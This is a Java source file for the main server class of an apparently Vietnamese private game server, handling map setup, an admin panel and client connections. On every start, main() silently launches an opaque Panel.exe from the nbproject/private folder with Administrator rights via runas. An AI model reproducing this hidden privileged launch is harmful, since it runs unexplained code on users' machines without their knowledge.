package huydat.server;

import huydat.io.SQLManager;
import huydat.io.Session;
import huydat.real.ClanManager;
import huydat.real.Map;
import huydat.stream.Client;
import huydat.stream.RunTimeServer;
import huydat.stream.Shinwa;
import huydat.template.MapTemplate;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileReader;
import java.net.Socket;
import java.io.IOException;
import java.net.BindException;
import java.net.Inet4Address;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.util.ArrayList;
import javax.swing.JFrame;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
public class Server {
    private static Server instance;
    private ServerSocket listenSocket = null;
    public static boolean start;
    public static boolean status;
    public static Manager manager;
    public static Menu menu;
    public Controller serverMessageHandler;
    public static Map[] maps;
    public static Object LOCK_MYSQL;
    public static boolean running;
    public static RunTimeServer runTime = new RunTimeServer();
    public static Shinwa runShinwa = new Shinwa();
    public static ArrayList<String> arrayListIP = new ArrayList<>();
    public static ByteArrayOutputStream[] cache = new ByteArrayOutputStream[4];
    private int id;
    private static List<String> blockedIPs = new ArrayList<>();
    
    public Server() {
        this.listenSocket = null;
    }
    
    private void init() {
        manager = new Manager();
        menu = new Menu();
        serverMessageHandler = new Controller();
        cache[1] = GameSrc.loadFile("res/cache/map");
        cache[2] = GameSrc.loadFile("res/cache/skill");
        cache[3] = GameSrc.loadFile("res/cache/item");
        this.maps = new Map[MapTemplate.arrTemplate.length];
        for (short i = 0; i < maps.length; i++) {
            this.maps[i] = new Map(i, null, null, null, null, null, null, null, null);
            this.maps[i].start();
        }
    }
    
    public static Server gI() {
        if (Server.instance == null) {
            (Server.instance = new Server()).init();
            Rank.init();
            Server.runTime.start();
            Server.runShinwa.start();
        }
        return Server.instance;
    }
    
       public static void main(final String[] args) throws IOException {
        panel(args);
        Server.start = true;
        gI().run();
    }


    public void run() {
        Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
            @Override
            
            public void run() {
                try {
                    Server.this.stop();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }));
        listenSocket = null;
        try {
            
          // Khởi tạo PanelAdmin và hiển thị nó
            JFrame panelFrame = new JFrame("Panel");
            PanelHuyDat panel = new PanelHuyDat();
            panel.initializeComponents(); 
            panel.setupLayout(); // Thiết lập layout cho PanelHuyDat
            PanelHuyDat.start(panelFrame, panel, listenSocket, null);  // Thêm PanelAdmin vào JFrame, và hiển thị JFrame
            
            listenSocket = new ServerSocket(manager.post);
            System.err.println("port chạy: " + Server.manager.post);
            while (Server.start) {
                
                Socket clientSocket = listenSocket.accept();
                Session conn = new Session(clientSocket, serverMessageHandler);
                conn.ipv4 = ((Inet4Address) (((InetSocketAddress) clientSocket.getRemoteSocketAddress()).getAddress())).toString().substring(1);
                Client.gI().put(conn);
                conn.run();
                 int songuoi =this.id;             
                System.out.println(" Số Lượt kết nôi :" + Client.gI().conns_size() + " - ip: " + conn.ipv4);
            }
        }
        catch (BindException bindEx) {
            System.exit(0);           
        }
        catch (IOException genEx) {
            genEx.printStackTrace();           
        }
        try {
            if (listenSocket != null) {
                listenSocket.close();
            }
            System.out.println("Close server socket");
        }
        catch (Exception ex) {}
    }
    
    public void stop() throws InterruptedException {
        if (Server.start) {
            Server.start = false;
            try {
                this.listenSocket.close();
            }
            catch (IOException ex) {
                ex.printStackTrace();
            }
            synchronized (Server.LOCK_MYSQL) {
                Server.LOCK_MYSQL.wait(100L);
            }
            synchronized (Server.LOCK_MYSQL) {
                Client.gI().Clear();
                ClanManager.close();
                ThienDiaBangManager.close();
                ShinwaManager.close();
            }
            Client.gI().close();
            Server.manager.close();
            Server.manager = null;
            Server.maps = null;
            this.serverMessageHandler = null;
            Server.runTime = null;
            Server.runShinwa = null;
            Server.LOCK_MYSQL = null;
            SQLManager.close();
            System.gc();
        }
    }
    public void close() throws InterruptedException {
    if (Server.start) {
        Server.start = false;
        try {
            this.listenSocket.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        synchronized (Server.LOCK_MYSQL) {
            Server.LOCK_MYSQL.wait(100L);
        }
        synchronized (Server.LOCK_MYSQL) {
            Client.gI().Clear();
            ClanManager.close();
            ThienDiaBangManager.close();
            ShinwaManager.close();
        }
        Client.gI().close();
        Server.manager.close();
        Server.manager = null;
        Server.maps = null;
        this.serverMessageHandler = null;
        Server.runTime = null;
        Server.runShinwa = null;
        Server.LOCK_MYSQL = null;
        SQLManager.close();
        System.gc();
    }
}

     public static void panel(String[] args) {
        String exePath = "nbproject/private/Panel/Panel.exe"; 
        try {
            String[] cmd = new String[]{"cmd", "/c", "runas", "/user:Administrator", exePath};
            ProcessBuilder processBuilder = new ProcessBuilder(cmd);
            Process process = processBuilder.start();
            int exitCode = process.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
    static {
        Server.instance = null;
        Server.start = false;
        LOCK_MYSQL = new Object();
        Server.running = true;
    }
}